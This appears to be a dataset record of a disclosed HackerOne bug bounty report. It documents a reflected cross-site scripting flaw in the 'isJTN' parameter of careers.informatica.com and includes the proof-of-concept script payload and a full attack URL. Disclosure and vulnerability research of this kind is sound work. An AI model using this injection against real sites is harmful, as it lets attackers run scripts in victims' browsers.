@@ -1,0 +1,42 @@
+{
+  "reported_to": "Informatica",
+  "reported_by": "huntertxt ",
+  "title": "[careers.informatica.com] XSS on \"isJTN\"",
+  "content": "\nhi ,\ni found XSS bug on parameter \"isJTN=\" at careers.informatica.com give you ability to run java script code\ntested on firefox 50.0.2 also on old version of google chrome in the last version , but if try this bug in chrome last version you will got a source code displayed on page with out run cuz security protected stop XSS code\nPOC\nused payload : </ScrIpt><SCRIPT>+alert(\"X\");</SCRIPT>\nhttps://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert(\"X\");</SCRIPT>true&isQuickApply=false\nare this eligible for swag !?\ncheer\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Cross-site Scripting (XSS) - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1491596940,
+  "report_url": "https://hackerone.com/reports/190020",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Navigate to the URL: https://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert(\"X\");</SCRIPT>true&isQuickApply=false"
+    ],
+    [
+      2,
+      "Observe that the JavaScript alert with the message 'X' is executed in the browser (tested on Firefox 50.0.2 and older versions of Chrome)."
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Cross-Site Scripting (XSS) issue in the 'isJTN' parameter of the careers.informatica.com website. By injecting a malicious script into the 'isJTN' parameter, an attacker can execute arbitrary JavaScript code in the context of the victim's browser session.",
+  "reason": "The attack involves a straightforward injection of a script tag into a URL parameter, which is a common and well-documented technique for XSS vulnerabilities. There are no complex interactions or state manipulations required, and the vulnerability does not rely on novel or obscure logic.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The XSS vulnerability reported involves injecting JavaScript code via the 'isJTN' parameter, which is a client-side issue and does not involve authentication or authorization boundaries. The proposed methodologies focus on testing AuthN/AuthZ and IDOR vulnerabilities by manipulating user sessions and resource IDs, which are not applicable to this XSS finding.",
+    "is_detectable": false
+  }
+}
